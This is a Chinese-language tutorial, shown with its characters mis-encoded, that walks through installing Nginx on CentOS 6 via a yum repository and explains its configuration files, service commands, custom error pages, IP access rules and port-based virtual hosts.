ä¸Šé¢çš„è¿‡ç¨‹ä¸»è¦å®‰è£…äº†ä¸€äº›linuxç³»ç»Ÿä¸‹é¢çš„ç¼–è¯‘å™¨ä»¥åŠä¸€äº›æœåŠ¡æˆ–è€…æ˜¯ç›¸å…³ä¾¿äºŽlinuxä½¿ç”¨çš„å†…å®¹ã€‚æœ‰å…´è¶£çš„å¯ä»¥ä¸€ä¸ªä¸€ä¸ªç™¾åº¦äº†è§£ å»ºç«‹ç›®å½•æ ¹æ®ä¸ªäººå–œå¥½ï¼Œå–œæ¬¢æ•´ç†çš„å°±å»ºç«‹ä¸€ä¸‹ï¼Œè‡ªå·±ä¸ºä¾‹ 123456789101112cd / # è¿›åŽ» '/' æ–‡ä»¶å¤¹cd root # è¿›åŽ» 'root' æ–‡ä»¶å¤¹ls # æ˜¾ç¤º root æ–‡ä»¶å¤¹é‡Œé¢çš„æ–‡ä»¶mkdir lbh # åˆ›å»ºlbhæ–‡ä»¶å¤¹cd lbh # è¿›åŽ» 'lbh' æ–‡ä»¶å¤¹mkdir app # åˆ›å»ºappæ–‡ä»¶å¤¹mkdir backup # åˆ›å»ºbackupæ–‡ä»¶å¤¹mkdir download # åˆ›å»ºdownloadæ–‡ä»¶å¤¹mkdir logs # åˆ›å»ºlogsæ–‡ä»¶å¤¹mkdir work # åˆ›å»ºworkæ–‡ä»¶å¤¹ls # æ˜¾ç¤º lbh æ–‡ä»¶å¤¹é‡Œé¢çš„æ–‡ä»¶# app backup download logs work ä¹Ÿå¯ä»¥ä½¿ç”¨xftpè¿›åŽ»å¯è§†çš„åˆ›å»ºå’ŒæŸ¥çœ‹ Nginxçš„å¿«é€Ÿæ­å»ºNginxç‰ˆæœ¬è¯´æ˜Žæ‰“å¼€nginxå®˜ç½‘çš„ä¸‹è½½é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°ä»¥ä¸‹å‡ ä¸ªç‰ˆæœ¬ Mainline version ï¼šå¼€å‘ç‰ˆ,ä¸»è¦æ˜¯ç»™å¹¿å¤§Nginxçˆ±å¥½è€…ï¼Œæµ‹è¯•ã€ç ”ç©¶å’Œå­¦ä¹ çš„ï¼Œä½†æ˜¯ä¸å»ºè®®ä½¿ç”¨äºŽç”Ÿäº§çŽ¯å¢ƒã€‚ Stable version : ç¨³å®šç‰ˆ,ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¯´çš„é•¿æœŸæ›´æ–°ç‰ˆæœ¬ã€‚è¿™ç§ç‰ˆæœ¬ä¸€èˆ¬æ¯”è¾ƒæˆç†Ÿï¼Œç»è¿‡é•¿æ—¶é—´çš„æ›´æ–°æµ‹è¯•ï¼Œæ‰€ä»¥è¿™ç§ç‰ˆæœ¬ä¹Ÿæ˜¯ä¸»æµç‰ˆæœ¬ã€‚ legacy version : åŽ†å²ç‰ˆæœ¬ï¼Œå¦‚æžœä½ éœ€è¦ä»¥å‰çš„ç‰ˆæœ¬ï¼ŒNginxä¹Ÿæ˜¯æœ‰æä¾›çš„ã€‚ 1yum list | grep nginx # æŸ¥çœ‹yumä¸­æ˜¯å¦å·²ç»æœ‰ nginx å¦‚æžœä¸å­˜åœ¨ï¼Œæˆ–è€…ä¸æ˜¯éœ€è¦çš„ç‰ˆæœ¬ï¼Œå¯ä»¥è‡ªè¡Œé…ç½®ã€‚ä»Žå®˜ç½‘çš„ stable ç‰ˆæœ¬å¯ä»¥å¾—ä¸‹ä»¥ä¸‹ä»£ç  12345[nginx]name=nginx repobaseurl=http://nginx.org/packages/OS/OSRELEASE/$basearch/gpgcheck=0enabled=1 åˆ›å»º yumæºå…ˆç”¨vim ç¼–è¾‘å™¨å»ºç«‹ä¸€ä¸ª yum æºï¼Œå…³äºŽ yumæºçš„è§£é‡Šï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºï¼šrepoæ–‡ä»¶å³æ˜¯Linuxä¸­å¸¸è¯´çš„æºæ–‡ä»¶(repositry)ï¼Œåœ¨ä½¿ç”¨yumå‘½ä»¤çš„æ—¶å€™ç³»ç»Ÿä¼šè‡ªåŠ¨è¯»å–repoæ–‡ä»¶ï¼Œç„¶åŽåŽ»repositryèŽ·å–è½¯ä»¶ã€‚æ¯ä¸€ä¸ªrepoæ–‡ä»¶ä»£è¡¨ä¸åŒçš„è½¯ä»¶æºï¼Œå…¶ä¸­çš„baseurlï¼Œè¡¨æ˜Žäº†repositryçš„åœ°å€ï¼Œæ”¯æŒftpåè®®ï¼Œhttpåè®®å’Œfileåè®®ã€‚å…¶ä»–å…·ä½“çš„è¯·è‡ªè¡Œç™¾åº¦ã€‚ 1vim /etc/yum.repos.d/nginx.repo æŽ¥ç€ä¼šå¼¹å‡ºä¸€ä¸ªç•Œé¢ï¼ŒæŒ‰ i(insert)ï¼Œå¤åˆ¶ç²˜è´´åˆšåˆšçš„ä»£ç ã€‚ä¿®æ”¹å…¶ä¸­çš„ä¸€äº›ä»£ç  1baseurl=http://nginx.org/packages/OS/OSRELEASE/$basearch/ OSå¯¹åº”ä½ ç³»ç»Ÿï¼Œæˆ‘çš„æ˜¯ centos,OSRELEASEæ˜¯ç‰ˆæœ¬å·ï¼Œæ”¹ä¸º 6ã€‚å®Œæ•´æ”¹å®Œ 12345[nginx]name=nginx repobaseurl=http://nginx.org/packages/centos/6/$basearch/gpgcheck=0enabled=1 æŽ¥ç€æŒ‰escé€€å‡ºç¼–è¾‘çŠ¶æ€ï¼Œå¹¶è¾“å…¥ :wqè¿›è¡Œä¿å­˜ã€‚yumæºå°±åˆ›å»ºå¥½äº†ã€‚æŽ¥ç€é‡æ–°è¾“å…¥ 1234567891011121314151617yum list | grep nginx # æŸ¥çœ‹yumä¸­æ˜¯å¦å·²ç»æœ‰ nginx#å¯ä»¥å¾—åˆ°nginx.x86_64 1.14.1-1.el6.ngx nginx nginx-debug.x86_64 1.8.0-1.el6.ngx nginx nginx-debuginfo.x86_64 1.14.1-1.el6.ngx nginx nginx-module-geoip.x86_64 1.14.1-1.el6.ngx nginx nginx-module-geoip-debuginfo.x86_64 1.14.1-1.el6.ngx nginx nginx-module-image-filter.x86_64 1.14.1-1.el6.ngx nginx nginx-module-image-filter-debuginfo.x86_64 1.14.1-1.el6.ngx nginx nginx-module-njs.x86_64 1.14.1.0.2.5-1.el6.ngx nginx nginx-module-njs-debuginfo.x86_64 1.14.1.0.2.5-1.el6.ngx nginx nginx-module-perl.x86_64 1.14.1-1.el6.ngx nginx nginx-module-perl-debuginfo.x86_64 1.14.1-1.el6.ngx nginx nginx-module-xslt.x86_64 1.14.1-1.el6.ngx nginx nginx-module-xslt-debuginfo.x86_64 1.14.1-1.el6.ngx nginx nginx-nr-agent.noarch 2.0.0-12.el6.ngx nginx pcp-pmda-nginx.x86_64 3.10.9-9.el6 base å¯ä»¥çœ‹åˆ°1.14.1çš„nginxï¼ŒæŽ¥ç€å®‰è£… 1yum install nginx å®‰è£…å®ŒæˆåŽï¼Œè¾“å…¥ 1nginx -v # nginx version: nginx/1.14.1 æœ‰ç‰ˆæœ¬å·å°±æ˜¯å·²ç»å®‰è£…å®Œæˆäº†ã€‚ NginxåŸºæœ¬é…ç½®æ–‡ä»¶è¯¦è§£åœ¨ä½¿ç”¨yumå®‰è£…å®ŒNginxåŽï¼Œéœ€è¦çŸ¥é“ç³»ç»Ÿä¸­å¤šäº†é‚£äº›æ–‡ä»¶ï¼Œå®ƒä»¬éƒ½å®‰è£…åˆ°äº†é‚£é‡Œã€‚å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¿›è¡ŒæŸ¥çœ‹ï¼š 1rpm -ql nginx rpm æ˜¯linuxçš„rpmåŒ…ç®¡ç†å·¥å…·ï¼Œ-q ä»£è¡¨è¯¢é—®æ¨¡å¼ï¼Œ-l ä»£è¡¨è¿”å›žåˆ—è¡¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ‰¾åˆ°nginxçš„æ‰€æœ‰å®‰è£…ä½ç½®äº†ã€‚å¯ä»¥çœ‹åˆ°ä»¥ä¸‹çš„å†…å®¹ nginx.confnginx.confæ–‡ä»¶æ˜¯Nginxçš„æ€»é…ç½®æ–‡ä»¶ï¼Œåœ¨æˆ‘ä»¬æ­å»ºæœåŠ¡å™¨çš„æ—¶å€™éœ€è¦ç»å¸¸è°ƒæ•´çš„æ–‡ä»¶ã€‚ è¿›å…¥ etc/nginxç›®å½•ä¸‹ï¼Œç”¨vimæ‰“å¼€ 12cd /etc/nginxvim nginx.conf ä¸‹é¢æ˜¯æ–‡ä»¶çš„æ³¨é‡Š 1234567891011121314151617181920212223242526272829user nginx; # è¿è¡Œç”¨æˆ·ï¼Œé»˜è®¤æ˜¯nginx,å¯ä»¥ä¸è¿›è¡Œè®¾ç½®worker_processes 1; # nginx è¿›ç¨‹ï¼Œä¸€èˆ¬è®¾ç½®ä¸ºå’ŒCPUæ ¸æ•°ä¸€æ ·error_log /var/log/nginx/error.log warn; # é”™è¯¯æ—¥å¿—å­˜æ”¾ç›®å½•pid /var/run/nginx.pid; # è¿›ç¨‹ pid å­˜æ”¾ä½ç½®events &#123; worker_connections 1024; # å•ä¸ªåŽå°è¿›ç¨‹çš„æœ€å¤§å¹¶å‘æ•°&#125;http &#123; include /etc/nginx/mime.types; #æ–‡ä»¶æ‰©å±•åä¸Žç±»åž‹æ˜ å°„è¡¨ default_type application/octet-stream; #é»˜è®¤æ–‡ä»¶ç±»åž‹ # è®¾ç½®æ—¥å¿—æ¨¡å¼ log_format main '$remote_addr - $remote_user [$time_local] "$request" ' '$status $body_bytes_sent "$http_referer" ' '"$http_user_agent" "$http_x_forwarded_for"'; access_log /var/log/nginx/access.log main; # nginx è®¿é—®æ—¥å¿—å­˜æ”¾ä½ç½® sendfile on; # å¼€å¯é«˜æ•ˆä¼ è¾“æ¨¡å¼ #tcp_nopush on; # å‡å°‘ç½‘ç»œæŠ¥æ–‡æ®µçš„æ•°é‡ keepalive_timeout 65; # ä¿æŒè¿žæŽ¥çš„æ—¶é—´ï¼Œä¹Ÿå«åšè¶…æ—¶æ˜¯å•Šé‡‘ #gzip on; # å¼€å§‹ gzipåŽ‹ç¼© include /etc/nginx/conf.d/*.conf; # åŒ…å«çš„å­é…ç½®é¡¹ä½ç½®å’Œæ–‡ä»¶&#125; default.confå¯ä»¥çœ‹åˆ°æœ€åŽæœ‰ä¸€ä¸ªå­æ–‡ä»¶çš„é…ç½®é¡¹ï¼Œé‚£æˆ‘ä»¬æ‰“å¼€è¿™ä¸ªincludeå­æ–‡ä»¶é…ç½®é¡¹çœ‹ä¸€ä¸‹é‡Œè¾¹éƒ½æœ‰äº›ä»€ä¹ˆå†…å®¹ã€‚ 12345678910[root@host ~]# cd /etc/nginx[root@host nginx]# vim nginx.conf[root@host nginx]# vim default.conf[root@host nginx]# lsconf.d koi-utf mime.types nginx.conf uwsgi_paramsfastcgi_params koi-win modules scgi_params win-utf[root@host nginx]# cd conf.d[root@host conf.d]# lsdefault.conf[root@host conf.d]# vim default.conf é€šè¿‡ä»¥ä¸ŠæŒ‡ä»¤è¿›å…¥ conf.dæ–‡ä»¶å¤¹ï¼Œç„¶åŽç”¨ vim ç¼–è¾‘å™¨æ‰“å¼€ default.confï¼Œå¾—åˆ°ä»¥ä¸‹æ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445server &#123; listen 80; # é…ç½®ç›‘å¬ç«¯å£ server_name localhost; # é…ç½®åŸŸå #charset koi8-r; #access_log /var/log/nginx/host.access.log main; location / &#123; root /usr/share/nginx/html; # æœåŠ¡é»˜è®¤å¯åŠ¨ç›®å½• index index.html index.htm; # é»˜è®¤è®¿é—®æ–‡ä»¶ &#125; #error_page 404 /404.html; # é…ç½®404é¡µé¢ # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; # é”™è¯¯çŠ¶æ€ç çš„æ˜¾ç¤ºé¡µé¢ï¼Œé…ç½®åŽéœ€è¦é‡æ–°å¯åŠ¨ location = /50x.html &#123; root /usr/share/nginx/html; &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \.php$ &#123; # proxy_pass http://127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \.php$ &#123; # root html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #&#125; # deny access to .htaccess files, if Apache's document root # concurs with nginx's one # #location ~ /\.ht &#123; # deny all; #&#125;&#125; æŒ‰ :qé€€å‡ºã€‚ æ˜Žç™½äº†è¿™äº›é…ç½®é¡¹ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬çš„æœåŠ¡ç›®å½•æ”¾åœ¨äº†/usr/share/nginx/htmlä¸‹ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤è¿›å…¥çœ‹ä¸€ä¸‹ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ 123cd /usr/share/nginx/htmlls# 50x.html index.html å¯ä»¥ç”¨ç¼–è¾‘å™¨åˆ†åˆ«æ‰“å¼€è¿™ä¸¤ä¸ªhtmlæ–‡ä»¶ 50.html 123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Error&lt;/title&gt;&lt;style&gt; body &#123; width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;An error occurred.&lt;/h1&gt;&lt;p&gt;Sorry, the page you are looking for is currently unavailable.&lt;br/&gt;Please try again later.&lt;/p&gt;&lt;p&gt;If you are the system administrator of this resource then you should checkthe &lt;a href="http://nginx.org/r/error_log"&gt;error log&lt;/a&gt; for details.&lt;/p&gt;&lt;p&gt;&lt;em&gt;Faithfully yours, nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; index.html 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;/title&gt;&lt;style&gt; body &#123; width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;&lt;p&gt;If you see this page, the nginx web server is successfully installed andworking. Further configuration is required.&lt;/p&gt;&lt;p&gt;For online documentation and support please refer to&lt;a href="http://nginx.org/"&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;Commercial support is available at&lt;a href="http://nginx.com/"&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; å¯åŠ¨æœåŠ¡åœ¨ nginx é»˜è®¤å¯åŠ¨ç›®å½•ä¸‹ï¼Œè¾“å…¥ 12345678910nginx -t # æµ‹è¯•é…ç½®# å¾—åˆ°# nginx: the configuration file /etc/nginx/nginx.conf syntax is ok# nginx: configuration file /etc/nginx/nginx.conf test is successfulnginx # æŽ¥ç€å¯åŠ¨æœåŠ¡ps -ef | grep nginx # æŸ¥çœ‹è¿›ç¨‹# root 24574 1 0 02:22 ? 00:00:00 nginx: master process nginx# nginx 24575 24574 0 02:22 ? 00:00:00 nginx: worker process# root 24577 24278 0 02:23 pts/0 00:00:00 grep nginx æŽ¥ç€æ‰“å¼€ä½ çš„æœåŠ¡å™¨çš„æ‰€åœ¨çš„ipåœ°å€ï¼Œçœ‹åˆ°ä»¥ä¸‹çš„ç”»é¢ï¼Œå°±è¯´æ˜Žé…ç½®æˆåŠŸäº† NginxæœåŠ¡å¯åŠ¨ã€åœæ­¢ã€é‡å¯æœåŠ¡å¯åŠ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œnginx æ˜¯ä¸ä¼šè‡ªåŠ¨å¼€å¯çš„ï¼Œéœ€è¦æ‰‹åŠ¨å¯åŠ¨ã€‚æœ‰å¤šç§æ–¹æ³• nginxç›´æŽ¥å¯åŠ¨ 1nginx systemctlå‘½ä»¤å¯åŠ¨ ä½¿ç”¨Linux çš„å‘½ä»¤è¿›è¡Œå¯åŠ¨ï¼Œè¿™ç§æ–¹æ³•æ— è®ºæ˜¯å¯åŠ¨ä»€ä¹ˆæœåŠ¡éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯æ›´æ”¹äº†æœåŠ¡çš„åå­— 1systemctl start nginx.service è¾“å…¥å‘½ä»¤åŽï¼Œæ²¡æœ‰ä»»ä½•çš„æç¤ºï¼Œç„¶åŽä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¿›è¡ŒæŸ¥è¯¢æœåŠ¡çš„è¿è¡ŒçŠ¶æ€ 1ps aux | grep nginx å¯ä»¥å¾—åˆ°ä¸‹é¢çš„ç»“æžœ 123root 24574 0.0 0.1 47384 948 ? Ss 02:22 0:00 nginx: master process nginxnginx 24575 0.0 0.7 47788 3680 ? S 02:22 0:00 nginx: worker processroot 24584 0.0 0.4 103380 2168 pts/0 S+ 02:45 0:00 grep nginx æœ‰äº†è¿™ä¸‰æ¡è®°å½•ï¼Œè¯´æ˜ŽNginx æœåŠ¡è¢«æ­£å¸¸å¼€å¯äº†ã€‚ æœåŠ¡åœæ­¢ç«‹å³åœæ­¢æœåŠ¡ 1nginx -s stop å¼ºåˆ¶åœæ­¢æ–¹æ³•ï¼Œæ— è®ºæ˜¯å¦åœ¨å·¥ä½œ ä»Žå®¹åœæ­¢æœåŠ¡ 1nginx -s quit è¿™ç§æ–¹æ³•éœ€è¦è¿›ç¨‹å®Œæˆå½“å‰å·¥ä½œåŽå†åœæ­¢ killadd åœæ­¢æœåŠ¡ 1killall nginx systemctlåœæ­¢æœåŠ¡ 1systemctl stop nginx.service æœåŠ¡é‡å¯systemctlé‡å¯æœåŠ¡ 1systemctl restart nginx.service é‡è½½é…ç½®æ–‡ä»¶ 1nginx -s reload æŸ¥çœ‹ç«¯å£å· åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒNginxå¯åŠ¨åŽä¼šç›‘å¬80ç«¯å£ï¼Œä»Žè€Œæä¾›HTTPè®¿é—®ï¼Œå¦‚æžœ80ç«¯å£å·²ç»è¢«å ç”¨åˆ™ä¼šå¯åŠ¨å¤±è´¥ã€‚æˆ‘ä¹ˆå¯ä»¥ä½¿ç”¨netstat -tlnpå‘½ä»¤æŸ¥çœ‹ç«¯å£å·çš„å ç”¨æƒ…å†µã€‚ 12345678910netstat -tlnp# å¯ä»¥çœ‹åˆ°Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 24574/nginx tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1465/master tcp 0 0 0.0.0.0:27652 0.0.0.0:* LISTEN 24426/sshd tcp 0 0 ::1:25 :::* LISTEN 1465/master tcp 0 0 :::443 :::* LISTEN 1906/python tcp 0 0 :::27652 :::* LISTEN 24426/sshd è‡ªå®šä¹‰é”™è¯¯é¡µå’Œè®¿é—®è®¾ç½®å¤šé”™è¯¯æŒ‡å‘ä¸€ä¸ªé¡µé¢åœ¨/etc/nginx/conf.d/default.conf æ˜¯å¯ä»¥çœ‹åˆ°ä¸‹é¢è¿™å¥è¯çš„ã€‚ 1error_page 500 502 503 504 /50x.html; error_pageæŒ‡ä»¤ç”¨äºŽè‡ªå®šä¹‰é”™è¯¯é¡µé¢ï¼Œ500ï¼Œ502ï¼Œ503ï¼Œ504 è¿™äº›å°±æ˜¯HTTPä¸­æœ€å¸¸è§çš„é”™è¯¯ç ï¼Œ/50.htmlç”¨äºŽè¡¨ç¤ºå½“å‘ç”Ÿä¸Šè¿°æŒ‡å®šçš„ä»»æ„ä¸€ä¸ªé”™è¯¯çš„æ—¶å€™ï¼Œéƒ½æ˜¯ç”¨ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„/50.htmlæ–‡ä»¶è¿›è¡Œå¤„ç†ã€‚ å•ç‹¬ä¸ºé”™è¯¯ç½®é¡¶å¤„ç†æ–¹å¼åœ¨default.conf æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹è®¾ç½® 1error_page 404 /404x.html; æŽ¥ç€è¾“å…¥ :wqä¿å­˜é€€å‡ºã€‚è¿›å…¥ç½‘ç«™çš„ç›®å½• usr/share/nginx/htmlæ–°å»ºä¸€ä¸ª404x.htmlæ–‡ä»¶ï¼Œå¹¶å†™å…¥ä¸€äº›ä¿¡æ¯ 123456&lt;html&gt;&lt;meta charset="UTF-8"&gt;&lt;body&gt;&lt;h1&gt;é”™è¯¯:404!é¡µé¢æ²¡æœ‰æ‰¾åˆ°!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; é‡å¯æœåŠ¡,å¾—åˆ°çš„é”™è¯¯é¡µé¢ æŠŠé”™è¯¯ç æ¢æˆä¸€ä¸ªåœ°å€å¤„ç†é”™è¯¯çš„æ—¶å€™ï¼Œä¸ä»…å¯ä»¥åªä½¿ç”¨æœ¬æœåŠ¡å™¨çš„èµ„æºï¼Œè¿˜å¯ä»¥ä½¿ç”¨å¤–éƒ¨çš„èµ„æºã€‚æ¯”å¦‚æˆ‘ä»¬å°†é…ç½®æ–‡ä»¶è®¾ç½®æˆè¿™æ ·ã€‚ 1error_page 404 http://laibh.top è¿™æ ·å­ï¼Œå½“æŠ¥404é”™è¯¯çš„æ—¶å€™å°±ä¼šé“¾æŽ¥åˆ°æˆ‘çš„åšå®¢çš„ç½‘å€åŽ»äº†ã€‚ã€ ç®€å•å®žçŽ°è®¿é—®æŽ§åˆ¶æœ‰æ—¶å€™æˆ‘ä»¬çš„æœåŠ¡å™¨åªå…è®¸ç‰¹å®šä¸»æœºè®¿é—®ï¼Œæ¯”å¦‚å†…éƒ¨OAç³»ç»Ÿï¼Œæˆ–è€…åº”ç”¨çš„ç®¡ç†åŽå°ç³»ç»Ÿï¼Œæ›´æˆ–è€…æ˜¯æŸäº›åº”ç”¨æŽ¥å£ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦æŽ§åˆ¶ä¸€äº›IPè®¿é—®ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æŽ¥åœ¨locationé‡Œè¿›è¡Œé…ç½®ã€‚ å¯ä»¥ç›´æŽ¥åœ¨default.confé‡Œè¿›è¡Œé…ç½®ã€‚ 1234location / &#123; deny 123.9.51.42; allow 45.76.202.231; &#125; é…ç½®å®ŒæˆåŽï¼Œé‡å¯ä¸€ä¸‹æœåŠ¡å™¨å°±å¯ä»¥å®žçŽ°é™åˆ¶(deny)å’Œå…è®¸(allow)è®¿é—®äº†ã€‚è¿™åœ¨å·¥ä½œä¸­éžå¸¸å¸¸ç”¨ï¼Œä¸€å®šè¦å¥½å¥½è®°å¾—ã€‚ Nginxè®¿é—®æƒé™denyæ˜¯ç¦æ­¢è®¿é—®ï¼Œallowæ˜¯å…è®¸è®¿é—®ã€‚ä½†Nginxçš„è®¿é—®æŽ§åˆ¶è¿˜æ˜¯æ¯”è¾ƒå¤æ‚çš„ æŒ‡ä»¤ä¼˜å…ˆçº§1234location / &#123; allow 45.76.202.231; deny all; &#125; ä¸Šé¢çš„é…ç½®ï¼Œè¡¨ç¤ºåªå…è®¸ 45.76.202.231è®¿é—®ï¼Œç¦æ­¢ipåœ°å€è®¿é—®ã€‚è€Œå¦‚æžœå°† denyè¯­å¥æå‰ï¼Œåˆ™ä¼šå‘çŽ°æ‰€æœ‰çš„ipéƒ½ä¸å¯ä»¥è®¿é—®äº†ã€‚è¿™è¯´æ˜Žäº†ï¼šåœ¨åŒä¸€ä¸ªå—ä¸­çš„ä¸¤ä¸ªæƒé™æŒ‡ä»¤ï¼Œå…ˆå‡ºçŽ°çš„è®¾ç½®ä¸ºè¦†ç›–åŽå‡ºçŽ°çš„è®¾ç½® å¤æ‚è®¿é—®æŽ§åˆ¶æƒé™åŒ¹é…åœ¨å·¥ä½œä¸­ï¼Œè®¿é—®æƒé™çš„æŽ§åˆ¶éœ€æ±‚æ›´åŠ å¤æ‚ï¼Œä¾‹å¦‚ï¼Œå¯¹äºŽç½‘ç«™ä¸‹çš„imgï¼ˆå›¾ç‰‡ç›®å½•ï¼‰æ˜¯è¿è¡Œæ‰€æœ‰ç”¨æˆ·è®¿é—®ï¼Œä½†å¯¹äºŽç½‘ç«™ä¸‹çš„adminç›®å½•åˆ™åªå…è®¸å…¬å¸å†…éƒ¨å›ºå®šIPè®¿é—®ã€‚è¿™æ—¶å€™ä»…é denyå’Œallowè¿™ä¸¤ä¸ªæŒ‡ä»¤ï¼Œæ˜¯æ— æ³•å®žçŽ°çš„ã€‚æˆ‘ä»¬éœ€è¦locationå—æ¥å®Œæˆç›¸å…³çš„éœ€æ±‚åŒ¹é…ã€‚ =ï¼šç²¾ç¡®åŒ¹é… ä¸Šé¢çš„éœ€æ±‚ï¼Œé…ç½®ä»£ç å¦‚ä¸‹ï¼š 123456location =/img&#123; allow all;&#125;location =/admin&#123; deny all;&#125; ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è®¾ç½®è®¿é—®æƒé™åªæœ‰ç²¾ç¡®åŒ¹é…æœ‰æ—¶æ˜¯å®Œä¸æˆæˆ‘ä»¬çš„å·¥ä½œä»»åŠ¡çš„ï¼Œæ¯”å¦‚çŽ°åœ¨æˆ‘ä»¬è¦ç¦æ­¢è®¿é—®æ‰€æœ‰phpçš„é¡µé¢ï¼Œphpçš„é¡µé¢å¤§å¤šæ˜¯åŽå°çš„ç®¡ç†æˆ–è€…æŽ¥å£ä»£ç ï¼Œæ‰€ä»¥ä¸ºäº†å®‰å…¨æˆ‘ä»¬ç»å¸¸è¦ç¦æ­¢æ‰€æœ‰ç”¨æˆ·è®¿é—®ï¼Œè€Œåªå¼€æ”¾å…¬å¸å†…éƒ¨è®¿é—®çš„ã€‚ 123location ~\.php$&#123; deny all;&#125; Nginxè®¾ç½®è™šæ‹Ÿä¸»æœºè™šæ‹Ÿä¸»æœºæ˜¯æŒ‡åœ¨ä¸€å°ç‰©ç†ä¸»æœºæœåŠ¡å™¨ä¸Šåˆ’åˆ†å‡ºå¤šä¸ªç£ç›˜ç©ºé—´ï¼Œæ¯ä¸ªç£ç›˜ç©ºé—´éƒ½æ˜¯ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œæ¯å°è™šæ‹Ÿä¸»æœºéƒ½å¯ä»¥å¯¹å¤–æä¾›WebæœåŠ¡ï¼Œå¹¶ä¸”äº’ä¸å¹²æ‰°ã€‚åœ¨å¤–ç•Œçœ‹æ¥ï¼Œè™šæ‹Ÿé“¸å°±æ˜¯ä¸€å°ç‹¬ç«‹çš„æœåŠ¡å™¨ä¸»æœºï¼Œè¿™æ„å‘³ç€ç”¨æˆ·èƒ½å¤Ÿåˆ©ç”¨è™šæ‹Ÿä¸»æœºæŠŠå¤šä¸ªä¸åŒåŸŸåçš„ç½‘ç«™éƒ¨ç½²åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œå³è§£å†³äº†ç»´æŠ¤æœåŠ¡å™¨æŠ€æœ¯çš„éš¾é¢˜ï¼ŒåŒæ—¶æœ‰èŠ‚çœäº†æœåŠ¡å™¨ç¡¬ä»¶æˆæœ¬å’Œç›¸å…³çš„ç»´æŠ¤è´¹ç”¨ã€‚ é…ç½®è™šæ‹Ÿä¸»æœºå¯ä»¥åŸºäºŽç«¯å£å·ã€åŸºäºŽIPå’ŒåŸºäºŽåŸŸåã€‚ åŸºäºŽç«¯å£å·é…ç½®è™šæ‹Ÿä¸»æœºåŸºäºŽç«¯å£å·æ¥é…ç½®è™šæ‹Ÿä¸»æœºï¼Œæ˜¯Nginx ä¸­æœ€ç®€å•çš„ä¸€ç§æ–¹å¼ï¼ŒåŽŸç†å°±æ˜¯Nginxç›‘å¬å¤šä¸ªç«¯å£ï¼Œæ ¹æ®ä¸åŒçš„ç«¯å£å·ï¼Œæ¥åŒºåˆ†ä¸åŒçš„ç½‘ç«™ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆè¿›å…¥ä¸»æ–‡ä»¶ etc/nginx/conf.d/default.conf,ç¼–è¾‘å™¨æ‰“å¼€ã€‚å¯ä»¥é€‰æ‹©æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶å¤¹ conf.dä¸‹é¢å°±å¯ä»¥ï¼Œä¹Ÿå¯ä»¥è¿˜æ˜¯é…ç½®åœ¨åŽŸæ¥çš„å­æ–‡ä»¶é‡Œã€‚ vim 8001.conf æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå‘½åä¸º 8001.conf, æŒ‰ié”®åŽè¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œæ–°å¢žé…ç½®æ–‡ä»¶çš„serveré€‰é¡¹ã€‚ 123456server&#123; listen 8001; # ç›‘å¬çš„ç«¯å£å· server_name localhost; # è®¿é—®æœ¬æœº root /usr/share/nginx/html/html8001; # æ–‡ä»¶è·¯å¾„ index index.html;&#125; escé€€å‡ºç¼–è¾‘æ¨¡å¼ï¼Œ:wqä¿å­˜æ–‡ä»¶ã€‚ è¿›å…¥åˆ°åŽŸæ¥ä¸Šä¸€ä¸ªæœåŠ¡æ–‡ä»¶è·¯å¾„ 1cd /usr/share/nginx/html æ–°å¢ž htmlæ–‡ä»¶å¤¹,å¹¶è¿›å…¥è¯¥æ–‡ä»¶å¤¹ï¼Œæ–°å¢ž index.html 123mkdir html8001cd html8001vim index.html 